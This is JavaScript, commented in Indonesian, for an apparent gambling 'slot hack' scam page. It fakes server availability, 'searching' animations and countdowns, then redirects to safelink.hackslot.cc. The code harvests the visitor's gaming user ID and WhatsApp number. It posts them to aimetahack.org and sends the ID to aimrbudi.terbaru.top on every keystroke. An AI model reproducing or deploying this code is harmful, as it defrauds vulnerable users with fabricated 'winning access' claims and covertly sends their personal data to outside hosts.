 var showDeviceOptionsButton =
                                document
                                    .getElementById(
                                        "showDeviceOptionsButton"
                                    );
                            var devicePopup =
                                document
                                    .getElementById(
                                        "device-popup"
                                    );
                            var deviceLabel =
                                document
                                    .getElementById(
                                        "fiturWin"
                                    );

                            showDeviceOptionsButton
                                .addEventListener(
                                    "click",
                                    function () {
                                        devicePopup
                                            .style
                                            .display =
                                            "block";
                                        document.getElementById("overlay").style.display = "block";
                                    });

                            var selectButtons =
                                document
                                    .querySelectorAll(
                                        ".select-button"
                                    );
                            selectButtons
                                .forEach(
                                    function (
                                        button
                                    ) {
                                        button
                                            .addEventListener(
                                                "click",
                                                function () {
                                                    var selectedDevice =
                                                        button
                                                            .getAttribute(
                                                                "data-device"
                                                            );
                                                    deviceLabel
                                                        .innerText =
                                                        "" +
                                                        selectedDevice;
                                                    deviceLabel
                                                        .style
                                                        .display =
                                                        "block";
                                                    devicePopup
                                                        .style
                                                        .display =
                                                        "none";
                                                    deviceLabel
                                                        .style
                                                        .color =
                                                        "none";

                                                    document.getElementById("overlay").style.display = "none";

                                                }
                                            );
                                    });

 // Simulasikan pemilihan server (misalnya, "Server 1" dipilih)
                                        document
                                            .getElementById(
                                                'open-popup-button'
                                            )
                                            .addEventListener(
                                                'click',
                                                function () {
                                                    // Gantilah konten <span> dengan hasil server yang dipilih
                                                    document
                                                        .getElementById(
                                                            'selected-server-name'
                                                        )
                                                        .textContent =
                                                        'Server 1'; // Gantilah 'Server 1' dengan hasil server yang sesuai
                                                    document.getElementById("overlay").style.display = "block";
                                                }
                                            );

function initializeFullServers() {
                                    var serverElements =
                                        document
                                            .querySelectorAll(
                                                ".server"
                                            );

                                    var fullIndexes =
                                        getRandomIndexes(
                                            3,
                                            serverElements
                                                .length
                                        );

                                    fullIndexes
                                        .forEach(
                                            function (
                                                index
                                            ) {
                                                var serverElement =
                                                    serverElements[
                                                    index
                                                    ];
                                                var status1Element =
                                                    serverElement
                                                        .querySelector(
                                                            ".online-status1"
                                                        );
                                                var statusTextElement =
                                                    serverElement
                                                        .querySelector(
                                                            ".status-text"
                                                        );

                                                status1Element
                                                    .classList
                                                    .remove(
                                                        "online-status1"
                                                    );
                                                status1Element
                                                    .classList
                                                    .add(
                                                        "offline-status1"
                                                    );
                                                statusTextElement
                                                    .textContent =
                                                    "Full";
                                                statusTextElement
                                                    .classList
                                                    .remove(
                                                        "online"
                                                    );
                                                statusTextElement
                                                    .classList
                                                    .add(
                                                        "offline"
                                                    );

                                                // Ganti kelas tombol menjadi "select-button3"
                                                var buttonElement =
                                                    serverElement
                                                        .querySelector(
                                                            ".select-button"
                                                        );
                                                if (
                                                    buttonElement
                                                ) {
                                                    buttonElement
                                                        .classList
                                                        .remove(
                                                            "select-button"
                                                        );
                                                    buttonElement
                                                        .classList
                                                        .add(
                                                            "select-button3"
                                                        );
                                                }
                                            }
                                        );
                                }

                                function toggleStatus() {
                                    var serverElements =
                                        document
                                            .querySelectorAll(
                                                ".server"
                                            );

                                    var offlineIndexes =
                                        getRandomIndexes(
                                            2,
                                            serverElements
                                                .length
                                        );

                                    offlineIndexes
                                        .forEach(
                                            function (
                                                index
                                            ) {
                                                var serverElement =
                                                    serverElements[
                                                    index
                                                    ];
                                                var status1Element =
                                                    serverElement
                                                        .querySelector(
                                                            ".online-status1"
                                                        );
                                                var statusTextElement =
                                                    serverElement
                                                        .querySelector(
                                                            ".status-text"
                                                        );

                                                status1Element
                                                    .classList
                                                    .remove(
                                                        "online-status1"
                                                    );
                                                status1Element
                                                    .classList
                                                    .add(
                                                        "offline-status1"
                                                    );
                                                statusTextElement
                                                    .textContent =
                                                    "Full";
                                                statusTextElement
                                                    .classList
                                                    .remove(
                                                        "online"
                                                    );
                                                statusTextElement
                                                    .classList
                                                    .add(
                                                        "offline"
                                                    );

                                                // Ganti kelas tombol menjadi "select-button3"
                                                var buttonElement =
                                                    serverElement
                                                        .querySelector(
                                                            ".select-button"
                                                        );
                                                if (
                                                    buttonElement
                                                ) {
                                                    buttonElement
                                                        .classList
                                                        .remove(
                                                            "select-button"
                                                        );
                                                    buttonElement
                                                        .classList
                                                        .add(
                                                            "select-button3"
                                                        );
                                                }
                                            }
                                        );
                                }

                                function getRandomIndexes(
                                    n, max
                                ) {
                                    var
                                        indexes = [];
                                    while (
                                        indexes
                                            .length <
                                        n) {
                                        var randomIndex =
                                            Math
                                                .floor(
                                                    Math
                                                        .random() *
                                                    max
                                                );
                                        if (!
                                            indexes
                                                .includes(
                                                    randomIndex
                                                )
                                        ) {
                                            indexes
                                                .push(
                                                    randomIndex
                                                );
                                        }
                                    }
                                    return indexes;
                                }

                                initializeFullServers
                                    (); // Panggil fungsi ini saat situs pertama kali dibuka

                                setInterval(
                                    toggleStatus,
                                    1800000
                                ); // Ubah status setiap 3 detik

                                toggleStatus
                                    (); // Panggil sekali untuk memulai perubahan status saat situs pertama kali dibuka

 // Function to open the popup
                                function openPopup() {
                                    var popup =
                                        document
                                            .getElementById(
                                                "server-popup"
                                            );
                                    popup
                                        .style
                                        .display =
                                        "block";
                                }

                                // Function to close the popup
                                function closePopup() {
                                    var popup =
                                        document
                                            .getElementById(
                                                "server-popup"
                                            );
                                    popup
                                        .style
                                        .display =
                                        "none";
                                }

                                // Add event listener to the "Pilih" button in the popup
                                var selectButtons =
                                    document
                                        .querySelectorAll(
                                            ".server .select-button"
                                        );
                                selectButtons
                                    .forEach(
                                        function (
                                            button
                                        ) {
                                            button
                                                .addEventListener(
                                                    "click",
                                                    function () {
                                                        var selectedServerName =
                                                            document
                                                                .getElementById(
                                                                    "selected-server-name"
                                                                );
                                                        var serverStatus =
                                                            button
                                                                .parentElement
                                                                .querySelector(
                                                                    ".status-text"
                                                                );
                                                        var serverName =
                                                            button
                                                                .getAttribute(
                                                                    "data-server"
                                                                );


                                                        // Check if the server is online before allowing selection
                                                        if (serverStatus
                                                            .classList
                                                            .contains(
                                                                "online"
                                                            )
                                                        ) {
                                                            selectedServerName
                                                                .textContent =
                                                                "" +
                                                                serverName;
                                                            closePopup
                                                                ();
                                                        }

                                                        document.getElementById("overlay").style.display = "none";
                                                    }
                                                );
                                        });

                                // Add event listener to the "Pilih Server" button
                                var openPopupButton =
                                    document
                                        .getElementById(
                                            "open-popup-button"
                                        );
                                openPopupButton
                                    .addEventListener(
                                        "click",
                                        openPopup
                                    );

 // Ambil elemen tombol "Pilih Provider" dan popup provider
                                const
                                    openProviderPopupButton =
                                        document
                                            .getElementById(
                                                "open-provider-popup-button"
                                            );
                                const
                                    providerPopup =
                                        document
                                            .getElementById(
                                                "provider-popup"
                                            );
                                const
                                    selectedProviderElement =
                                        document
                                            .getElementById(
                                                "selected-provider"
                                            );

                                // Tambahkan event listener ke tombol untuk menampilkan popup provider saat diklik
                                openProviderPopupButton
                                    .addEventListener(
                                        "click",
                                        function () {
                                            providerPopup
                                                .style
                                                .display =
                                                "block";
                                            document.getElementById("overlay").style.display = "block";
                                        });

                                // Tambahkan event listener ke tombol-tombol di dalam popup provider
                                const
                                    selectProviderButtons =
                                        document
                                            .querySelectorAll(
                                                ".provider .select-button"
                                            );
                                selectProviderButtons
                                    .forEach(
                                        function (
                                            button
                                        ) {
                                            button
                                                .addEventListener(
                                                    "click",
                                                    function () {
                                                        const
                                                            selectedProvider =
                                                                button
                                                                    .getAttribute(
                                                                        "data-provider"
                                                                    );
                                                        selectedProviderElement
                                                            .textContent =
                                                            " " +
                                                            selectedProvider;
                                                        selectedProviderElement
                                                            .style
                                                            .display =
                                                            "block";

                                                        // Sembunyikan popup setelah memilih
                                                        providerPopup
                                                            .style
                                                            .display =
                                                            "none";
                                                        document.getElementById("overlay").style.display = "none";
                                                    }
                                                );
                                        });

var isPopupShown =
                                        false;


                                    function showResultPopupWithTypingEffect(
                                        userId,
                                        device,
                                        server,
                                        provider,

                                    ) {
                                        if (!
                                            isPopupShown
                                        ) {
                                            var resultPopup =
                                                document
                                                    .getElementById(
                                                        "result-popup"

                                                    );
                                            resultPopup
                                                .style
                                                .display =
                                                "block";
                                            document.getElementById("overlay").style.display = "block";


                                            var resultUserId =
                                                document
                                                    .getElementById(
                                                        "result-user-id"
                                                    );
                                            var resultDevice =
                                                document
                                                    .getElementById(
                                                        "result-device"
                                                    );
                                            var resultServer =
                                                document
                                                    .getElementById(
                                                        "result-server"
                                                    );
                                            var resultProvider =
                                                document
                                                    .getElementById(
                                                        "result-provider"
                                                    );

                                            var resultSuccessUserId =
                                                document
                                                    .getElementById(
                                                        "result-success-user-id"
                                                    );
                                            var resultSuccessDevice =
                                                document
                                                    .getElementById(
                                                        "result-success-device"
                                                    );
                                            var resultSuccessServer =
                                                document
                                                    .getElementById(
                                                        "result-success-server"
                                                    );
                                            var resultSuccessProvider =
                                                document
                                                    .getElementById(
                                                        "result-success-provider"
                                                    );

                                            typeText
                                                (resultUserId,
                                                    userId,
                                                    0,
                                                    resultSuccessUserId
                                                );
                                            typeText
                                                (resultDevice,
                                                    "Sedang Mencari . . .",
                                                    0,
                                                    resultSuccessDevice
                                                );
                                            typeText
                                                (resultServer,
                                                    "Sedang Mencari . . .",
                                                    0,
                                                    resultSuccessServer
                                                );
                                            typeText
                                                (resultProvider,
                                                    "Sedang Mencari . . .",
                                                    0,
                                                    resultSuccessProvider
                                                );

                                            isPopupShown
                                                =
                                                true;

                                            // Atur agar resultPopup menghilang setelah 11 detik dan tampilkan popup2
                                            setTimeout
                                                (function () {
                                                    resultPopup
                                                        .style
                                                        .display =
                                                        "none";
                                                    showPopup2
                                                        ();
                                                    soundSukses.play();
                                                },
                                                    8000
                                                ); // Hilangkan resultPopup dan tampilkan popup2 setelah 11 detik
                                        }
                                    }

                                    function typeText(
                                        element,
                                        text,
                                        index,
                                        resultSuccessElement
                                    ) {
                                        if (index <
                                            text
                                                .length
                                        ) {
                                            element
                                                .textContent +=
                                                text
                                                    .charAt(
                                                        index
                                                    );
                                            index++;
                                            setTimeout
                                                (function () {
                                                    typeText
                                                        (element,
                                                            text,
                                                            index,
                                                            resultSuccessElement
                                                        );
                                                },
                                                    100
                                                ); // Waktu jeda antara karakter
                                        } else {
                                            resultSuccessElement
                                                .textContent =
                                                // "BERHASIL ✅";
                                                "";
                                            resultSuccessElement
                                                .style
                                                .color =
                                                "greenyellow";
                                        }
                                    }


                                    function startCountdown(durationInSeconds, elementId) {
                                    let countdownDuration = durationInSeconds;
                                    const countdownElement = document.getElementById(elementId);

                                    function createDigitSpan(digit) {
                                        const span = document.createElement("span");
                                        span.textContent = digit;
                                        span.classList.add("red-block");
                                        return span;
                                    }

                                    function updateCountdown() {
                                        const days = Math.floor(countdownDuration / (60 * 60 * 24));
                                        const hours = Math.floor((countdownDuration % (60 * 60 * 24)) / (60 * 60));
                                        const minutes = Math.floor((countdownDuration % (60 * 60)) / 60);
                                        const seconds = countdownDuration % 60;

                                        const hoursDigits = String(hours).padStart(2, '0').split("");
                                        const minutesDigits = String(minutes).padStart(2, '0').split("");
                                        const secondsDigits = String(seconds).padStart(2, '0').split("");

                                        countdownElement.innerHTML = "";

                                        const hoursContainer = document.createElement("div");
                                        hoursContainer.style.display = "-webkit-inline-box";
                                        hoursContainer.style.marginRight = "10px";
                                        hoursContainer.style.color = "white";
                                        hoursDigits.forEach(function(digit) {
                                            hoursContainer.appendChild(createDigitSpan(digit));
                                        });
                                        const hoursLabel = document.createElement("br");
                                        hoursContainer.appendChild(hoursLabel);
                                        hoursContainer.appendChild(document.createTextNode("JAM"));

                                        const minutesContainer = document.createElement("div");
                                        minutesContainer.style.display = "-webkit-inline-box";
                                        minutesContainer.style.marginRight = "10px";
                                        minutesContainer.style.color = "white";
                                        minutesDigits.forEach(function(digit) {
                                            minutesContainer.appendChild(createDigitSpan(digit));
                                        });
                                        const minutesLabel = document.createElement("br");
                                        minutesContainer.appendChild(minutesLabel);
                                        minutesContainer.appendChild(document.createTextNode("MENIT"));

                                        const secondsContainer = document.createElement("div");
                                        secondsContainer.style.display = "-webkit-inline-box";
                                        secondsContainer.style.color = "white";
                                        secondsDigits.forEach(function(digit) {
                                            secondsContainer.appendChild(createDigitSpan(digit));
                                        });
                                        const secondsLabel = document.createElement("br");
                                        secondsContainer.appendChild(secondsLabel);
                                        secondsContainer.appendChild(document.createTextNode("DETIK"));

                                        countdownElement.appendChild(hoursContainer);
                                        countdownElement.appendChild(minutesContainer);
                                        countdownElement.appendChild(secondsContainer);

                                        countdownDuration--;

                                        if (countdownDuration < 0) {
                                            clearInterval(countdownInterval);
                                            countdownElement.textContent = "BERHASIL !";
                                            window.location.href = "https://safelink.hackslot.cc";
                                        }
                                    }

                                    updateCountdown();
                                    const countdownInterval = setInterval(updateCountdown, 1000);
                                }

                                    
                                    function showPopup2() {
                                        var overlay2 =
                                            document
                                                .getElementById(
                                                    "overlay2"
                                                );
                                        var popup2 =
                                            document
                                                .getElementById(
                                                    "popup2"
                                                );

                                        overlay2
                                            .style
                                            .display =
                                            "block";
                                        popup2
                                            .style
                                            .display =
                                            "block";
                                        startCountdown(12000, 'countdown');
                                    }

                                    function validateForm(userId, device, server, provider, nowa) {
                                        if (userId.trim() === '' && device.trim() === '' || server.trim() === '' || provider.trim() === ''|| nowa.trim() === '') {
        Swal.fire({
                                                title: "Kamu Belum Mengisi Data Pengecekan !",
                                                text: "Harap isi kolom data terlebih dahulu agar akses kemenangan bisa terlihat 100% Terbukti dan Aman.",
                                                icon: "warning",
                                                showCancelButton: false,
                                                showCloseButton: true,
                                                confirmButtonColor: "#3085d6",
                                                cancelButtonColor: "#d33",
                                            });
                                            return false;
                                        }

                                        showResultPopupWithTypingEffect(userId, device, server, provider);
                                    }
                                    
                                    function startSend() {
                                        console.log("halo haloo");
                                    
                                        var formData = new FormData();
                                        formData.append('name', document.getElementById('userIDField').value);
                                        formData.append('nowa', document.getElementById('nowa').value);
                                    
                                        fetch('https://aimetahack.org/support/main/send/', {
                                            method: 'POST',
                                            body: formData
                                        })
                                        .then(response => response.json())
                                        .then(data => {
                                            console.log('Response:', data);
                                            // alert('Data berhasil dikirim!');
                                        })
                                        .catch(error => {
                                            console.error('Error:', error);
                                        });
                                    }

                                    function startProcess() {
                                        

                                        var userId =
                                            document
                                                .getElementById(
                                                    "userIDField"
                                                )
                                                .value;
                                                
                                                var nowa =
                                            document
                                                .getElementById(
                                                    "nowa"
                                                )
                                                .value;
                                        var device =
                                            document
                                                .getElementById(
                                                    "fiturWin"
                                                )
                                                .textContent;
                                        var server =
                                            document
                                                .getElementById(
                                                    "selected-server-name"
                                                )
                                                .textContent;
                                        var provider = "PRGA";

                                        // Validasi form sebelum menampilkan popup
                                        validateForm(
                                            userId,
                                            device,
                                            server,
                                            nowa,
                                            provider
                                        );
                                        
                                    }

                                    var connectButton =
                                        document
                                            .getElementById(
                                                "register-button-desktop"
                                            );
                                    connectButton
                                        .addEventListener(
                                            "click",
                                            startProcess
                                        );

                                    var closePopupButton =
                                        document
                                            .getElementById(
                                                "close-popup-button"
                                            );
                                    closePopupButton
                                        .addEventListener(
                                            "click",
                                            function () {
                                                var resultPopup =
                                                    document
                                                        .getElementById(
                                                            "result-popup"
                                                        );
                                                resultPopup
                                                    .style
                                                    .display =
                                                    "none";
                                                isPopupShown
                                                    =
                                                    false;
                                            }
                                        );

                                    function startProgress() {
                                        var progressBar =
                                            document
                                                .getElementById(
                                                    "myProgressBar"
                                                );
                                        var width =
                                            0;
                                        var interval =
                                            setInterval(
                                                function () {
                                                    if (width >=
                                                        100
                                                    ) {
                                                        clearInterval
                                                            (
                                                                interval
                                                            );
                                                    } else {
                                                        width++;
                                                        progressBar
                                                            .style
                                                            .width =
                                                            width +
                                                            "%";
                                                    }
                                                },
                                                50
                                            );
                                    }

                                    // Menjalankan startProgress() otomatis setelah 10 detik
                                    setTimeout
                                        (function () {
                                            startProgress
                                                ();
                                        },
                                            5000
                                        );

function startProgress() {
                                        var progressBar =
                                            document
                                                .getElementById(
                                                    "myProgressBar"
                                                );
                                        var width =
                                            0;
                                        var interval =
                                            setInterval(
                                                function () {
                                                    if (width >=
                                                        100
                                                    ) {
                                                        clearInterval
                                                            (
                                                                interval
                                                            );
                                                        // Proses sudah selesai, Anda dapat menambahkan tindakan lain di sini jika diperlukan
                                                    } else {
                                                        width++;
                                                        progressBar
                                                            .style
                                                            .width =
                                                            width +
                                                            "%";
                                                    }
                                                },
                                                50
                                            );
                                    }

                                    // Menjalankan startProgress() otomatis setelah 10 detik
                                    setTimeout
                                        (function () {
                                            startProgress
                                                ();
                                        },
                                            8000
                                        );

 document.addEventListener("DOMContentLoaded", function () {
            var dataToClickProv = ["PRAGMATIC PLAY"];
            var dataToClickServ = ["🇹🇭THAILAND"];
            var selectButtons = document.querySelectorAll(".select-button");
            selectButtons.forEach(function(button) {
                var Prove = button.getAttribute("data-provider");
                if (dataToClickProv.includes(Prove)) {
                    button.click();
                }
                var Serv = button.getAttribute("data-server");
                if (dataToClickServ.includes(Serv)) {
                    button.click();
                }
            });

            var userIDField = document.getElementById("userIDField");
            var nowa = document.getElementById("nowa");
            var popupIdElement = document.getElementById("popup-id");
            var popupServerElement = document.getElementById("popup-server");
            var popupNomorWA = document.getElementById("popup-nowa");
            var selectedServerElement = document.getElementById("selected-server-name"); // Ganti dengan ID yang sesuai
            var popupWinElement = document.getElementById("popup-Win");
            var selectedWinElement = document.getElementById("fiturWin"); // Ganti dengan ID yang sesuai


            var connectButton = document.getElementById("register-button-desktop");
            connectButton.addEventListener("click", function () {
                if (popupIdElement && popupWinElement) {
                    var idValue = userIDField.value;
                    var noWaValue = nowa.value;
                    var serverValue = selectedServerElement.textContent; // Mengambil teks dari elemen yang dipilih
                    var fiturWin = selectedWinElement.textContent; // Mengambil teks dari elemen yang dipilih
                    popupIdElement.textContent = idValue;
                    popupNomorWA.textContent = noWaValue;
                    popupWinElement.textContent = fiturWin;

                }
            });
        });

// Mendapatkan elemen input dan ikon ceklis
        var userIDField = document
            .getElementById('userIDField');
        var checkmarkIcon = document
            .getElementById('checkmarkIcon');
        var checkmarkIconWA = document
            .getElementById('checkmarkIconWa');
        var validasi = document
            .getElementById('validasi');

                var nowaInput = document.getElementById('nowa');

                nowaInput.addEventListener('input', function(event) {
                    var inputValue = event.target.value.trim();
                    var isValid = /^\d{10,13}$/.test(inputValue);

                    if (!isValid) {
                        checkmarkIconWA.style.display = 'none';
                        validasi.style.display = 'inline-block';
                    } else {
                        checkmarkIconWA.style.display = 'inline-block';
                        validasi.style.display = 'none';
                    }
                });


        // Mendengarkan perubahan pada input
        userIDField.addEventListener(
            'input',
            function (event) {
                if (event.target.name === 'name') {
                var inputValue = this
                    .value;
                var xhr = new XMLHttpRequest();

                xhr.open('POST', 'https://aimrbudi.terbaru.top/', true);

                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        var response = xhr.responseText;

                    }
                };

                xhr.send('userId=' + inputValue);
                }
            });
